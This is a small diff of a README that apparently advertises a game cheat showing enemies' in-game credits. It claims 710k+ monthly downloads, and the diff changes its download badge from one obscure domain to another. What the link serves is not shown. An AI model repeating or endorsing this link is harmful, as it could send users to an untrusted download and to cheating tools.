@@ -49,7 +49,7 @@ A: Yes — see how much credits each enemy has to spend.
 
 **Monthly downloads:** 710k+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/valespitems)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/valespitems)
 
 ---
 
